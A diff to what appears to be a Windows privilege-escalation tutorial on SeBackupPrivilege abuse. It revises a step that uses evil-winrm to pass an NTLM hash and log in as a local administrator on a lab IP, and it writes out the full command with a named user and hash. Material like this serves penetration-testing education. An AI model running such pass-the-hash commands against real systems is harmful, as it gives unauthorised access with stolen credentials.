@@ -426,10 +426,10 @@ Outcome:
 
 ![SeBackupPrivilege-Exploitation-Observe-NTLM-Hashes](/Pictures/SeBackUp-Exploitation-2.png)
 
-4) Use again evil-winrm to pass the hash and connect as Administrator.
+4) Use again evil-winrm to pass the hash and connect as Local Administrator.
 
 ```
-evil-winrm -i 192.168.146.130 -u Administrator -H "31d6cfe0d16ae931b73c59d7e0c089c0"
+evil-winrm -i 192.168.146.130 -u "Nikos Vourdas" -H "20117ce437cde2e30f4612c4c82196b0"
 ```
 
 Outcome:
